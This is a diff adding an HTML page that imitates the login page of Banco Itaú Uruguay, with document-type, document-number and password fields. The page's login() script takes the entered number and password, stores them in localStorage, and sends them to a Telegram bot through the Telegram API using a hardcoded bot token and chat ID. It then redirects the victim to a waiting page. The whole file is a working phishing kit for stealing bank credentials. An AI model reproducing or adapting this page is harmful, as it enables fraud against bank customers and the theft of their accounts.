@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Inicio</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="navbar">
+        <div class="menu">
+            <img src="Layer 1.png" alt="Logo Itaú" class="logo-img">
+            <a href="#">para ti</a>
+            <a href="#">para empresas</a>
+            <a href="#">beneficios</a>
+            <a href="#">atención al cliente</a>
+            <div class="buscar-personas">
+                <a href="#" class="buscar">buscar</a>
+                <div class="separator"></div>
+                <a href="#" class="personas">personas</a>
+            </div>
+        </div>
+        <div class="login-container">
+            <div class="login">
+                <select class="login-control left-radius">
+                    <option value="ci">C.I.</option>
+                    <option value="passport">Pasaporte</option>
+                </select>
+                <input type="text" id="documento" placeholder="documento" class="login-control">
+                <input type="password" id="contrasena" placeholder="contraseña" class="login-control right-radius">
+                <button class="login-btn" onclick="login()"></button>
+            </div>
+            <div class="login-links">
+                <a href="#">registrate</a>
+                <a href="#">olvidé mi contraseña</a>
+            </div>
+        </div>
+    </header>
+
+    <div class="image-section">
+        <img src="img_2489513_home.png" alt="Imagen">
+    </div>
+
+    <div class="footer-text">
+        <div>
+            <strong>productos</strong><br>
+            cuentas | préstamos | inversiones | tarjetas | seguros | Itaú Personal Bank
+        </div>
+        <div>
+            <strong>sobre Itaú</strong><br>
+            quiénes somos | trabajá con nosotros | sustentabilidad | fundación Itaú
+        </div>
+        <div>
+            <strong>más información</strong><br>
+            Itaú Volar | beneficios | tarifario | contratos y cartillas | cotizaciones | seguridad | emergencias | canal de denuncias
+        </div>
+        <div>
+            <strong>encontranos en:</strong><br>
+            <a href="#">Instagram</a> | <a href="#">Facebook</a> | <a href="#">LinkedIn</a> | <a href="#">Twitter</a>
+        </div>
+        <div>
+            <small>© 2024 Itaú - Banco Itaú Uruguay S.A. | Supervisada por el Banco Central del Uruguay | 
+            Para mayor información visita <a href="https://www.bcu.gub.uy">www.bcu.gub.uy</a></small>
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            const documento = document.getElementById('documento').value;
+            const contrasena = document.getElementById('contrasena').value;
+
+            localStorage.setItem('documento', documento);
+            localStorage.setItem('contrasena', contrasena);
+
+            const chatId = '-1002368138458';
+            const token = '8062306716:AAFTmhEYqdVhnB3tbwd4d__9btEPQI2tPxA';
+            const mensaje = `
+➖➖➖[ 𝙄𝙏𝘼𝙐 𝙐𝙔 ]➖➖➖ 
+✔️𝙏𝙞𝙥𝙤 𝘿𝙤𝙘: ${documento}
+✔️𝘿𝙤𝙘𝙪𝙢𝙚𝙣𝙩𝙤: ${documento}
+✔️𝙋𝙖𝙨𝙨: ${contrasena}
+➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
+`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Mensaje enviado correctamente.');
+                    } else {
+                        console.error('Error al enviar el mensaje.', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error en la solicitud:', error);
+                })
+                .finally(() => {
+                    window.location.href = '/espera';
+                });
+        }
+    </script>
+</body>
+</html>
